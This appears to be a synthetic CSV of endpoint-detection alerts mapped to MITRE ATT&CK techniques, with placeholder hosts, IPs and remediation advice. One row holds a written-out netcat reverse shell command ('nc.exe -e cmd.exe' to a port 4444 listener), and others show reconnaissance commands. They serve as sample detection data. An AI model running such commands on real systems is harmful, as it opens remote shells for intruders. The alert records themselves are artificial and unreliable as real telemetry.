0902405,,2023-03-09T12:00:00.000000Z,,,,Multi-Stage Command and Control,Detection of multi-stage command and control traffic,,,,,,,,,,,,C:\Windows\System32\svchost.exe -k netsvcs,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,svchost.exe,,,,,,1234,5678,,,,,,,,,,,,,explorer.exe,C:\Windows\explorer.exe,,,,,,,,,,,,,,,,,,,,TCP,,,,443,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
pr4p5-f,,,,,,Native API,Defender for Endpoint has detected suspicious use of a Native API on the system.,,,,,,Native API (T1106),,,,,,,,,,,,,,,,,High,,,,,System Call,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Analyze the system for any suspicious activities or processes and block the process that was making the suspicious call.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,explorer.exe,,,,,,,,,,,,,,,,,,,"Defender for Endpoint detected a process using a Native API function to interact with the operating system. The API function is commonly used by malware to execute commands or perform actions on the system, and can be an indicator of malicious activity.",C:\Windows\explorer.exe,"explorer.exe /root,C:\Windows\system32",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
30340ed0r5,,2023-03-09T12:00:00.000000Z,,,,Non-Application Layer Protocol,Detection of non-application layer protocol traffic,,,,,,,,,,,,C:\Windows\System32\nslookup.exe example.com,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,nslookup.exe,,,,,,1234,5678,,,,,,,,,,,,,cmd.exe,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,,,,,UDP,,,,53,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
203040fd,,2023-03-09T12:00:00.000000Z,,,,Non-Standard Port,Detection of network traffic to a non-standard port,,,,,,,,,,,,C:\Program Files\curl\curl.exe https://example.com:12345,,,,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,Command and Control,,,,curl.exe,,,,,,1234,,,,,,,,,,,,,,cmd.exe,C:\Windows\System32\cmd.exe,,,,,,,,,,,,,,,,,,,,TCP,,,,12345,,,,,,,,,,DOMAIN\user,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,192.168.1.100,10.0.0.2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
0304054d,,2023-03-10T10:30:00Z,,,,Obfuscated Files,Adversaries may also obfuscate commands executed from payloads or directly via a Command and Scripting Interpreter.,,,,,,Obfuscated Files or Information,,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Defense Evasion,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the file to determine the nature and purpose of the obfuscation.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Program Files\Malware\malware.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
T1566,,,,,,Potential Phishing Attempt,An email was received with suspicious content and links. The user did not click on any links or respond to the email.,,,,,,,,,,,,,,,,,,,,,,,High,,,Phishing,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,2023-03-04T13:45:30Z,"{'UserName': 'johndoe', 'UserDisplayName': 'John Doe', 'UserEmail': 'johndoe@example.com', 'UserAgent': 'Microsoft Outlook', 'UserIP': '192.168.1.20'}","{'SenderEmail': 'spoofed@example.com', 'RecipientEmail': 'johndoe@example.com', 'Subject': 'Important: Action Required', 'URLs': ['http://malicious.com', 'http://phishing.com'], 'Attachments': ['invoice.pdf']}",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
3-04-5-ft5,,2023-03-10T12:00:00Z,,,,Pre-OS Boot,"Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system.",,,,,,Pre-OS Boot,,,,,,,,,,,,,,,,,Critical,,,,,,,,,,,,,,,,,Persistence,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Isolate the affected host and perform a forensic analysis of the pre-OS boot image to determine the nature and purpose of the modification.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\bootmgr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
toeodo56,,2023-03-09T15:30:00Z,,,,Protocol Tunneling,Adversaries may tunnel network communications to and from a victim system within a separate protocol to avoid detection/network filtering and/or enable access to otherwise unreachable systems. Tunneling involves explicitly encapsulating a protocol within another.,,,,,,,,,,,,,Network traffic analysis,"['Isolate affected endpoints', 'Investigate network traffic']",,,,,,,,,High,,,Endpoint detection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Protocol: HTTP over DNS,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"['Endpoint1', 'Endpoint2']","['192.168.1.10', '10.0.0.2']",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
33440rft,,2023-03-10T15:45:00Z,,,,Reflective Code,.,,,,,,"Adversaries may reflectively load code into a process in order to conceal the execution of malicious payloads. Reflective loading involves allocating then executing payloads directly within the memory of the process, vice creating a thread or process backed by a file path on disk",,,,,,,,,,,,,,,,,High,,,,,,,,,,,,,,,,,Execution,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Investigate the injected process and loader process to determine the nature and purpose of the reflective code loading activity and remediate accordingly.,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,hostname123,explorer.exe,,,Defender for Endpoint EDR,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,notepad.exe,Reflective DLL Injection,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
20345q,,2023-03-09T10:30:00Z,,,,Remote Access,Remote access tools may be installed and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system.,,,,,,,,,,,,nc.exe -e cmd.exe 10.0.0.2 4444,,,,,,,,,,,High,,,,,,,,,,,,,,,,,,,,,nc.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\nc.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,A2D3F4B5C6E7A8B9,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,cmd.exe,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\cmd.exe,B9A8E7C6B5F4D3A2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
pdpdf03r4,,,,,,Scheduled Task,A new scheduled task/job was created or modified on the system.,,,,,,Scheduled Task/Job,,,,,,,,,,,,,,,,,High,,,,,Malware Persistence,,,,,,,,,,,,Persistence,,,,,,,,192.168.1.100,,,,,,,,,,,,,,,,,,,,,,,,System Process,Task Scheduler,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,DESKTOP-ABC123,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments).",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
iododw0r,,2022-04-01T09:22:14.866Z,,,,Deployment Tool,An instance of a software deployment tool was detected on a system,,,,,,,,,,,,microsoft.deploymentsomething.exe /install /quiet,,,,,,,,,,,High,,,,,,,,,,,,,EDR,,,,,,,,microsoft.deploymentsomething.exe,,,,192.168.0.10,,1234,5678,,,,,,,,,,,,,setup.exe,setup.exe /install,,,,,,,Endpoint,Hostname-01,,,,,,,,Microsoft Defender for Endpoint,,,,,,,,,,,,,,C:\Users\Admin\Downloads\setup.exe,C:\Program Files (x86)\Microsoft\Deployment\v10.0\Bin\microsoft.deploymentsomething.exe,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
12345,,2023-03-10T15:30:00Z,,,,Suspicious Trusted Relationship,Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.,,,,,,,,,,,,,Behavior monitoring,,,,,,,,,,High,,,,,Trusted Relationship,,,,,,,,,,,,,,,,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,,,192.168.1.100,,,,,,,,,,,,,,,,services.exe,,,,,,,,,,Windows 10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,PC-1234,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,20H2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,C:\Windows\System32\ntdll.dll,C:\Windows\System32\cmd.exe,cmd.exe,cmd.exe /c whoami,Execution,T1199,Trusted Relationship,00:11:22:33:44:55,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
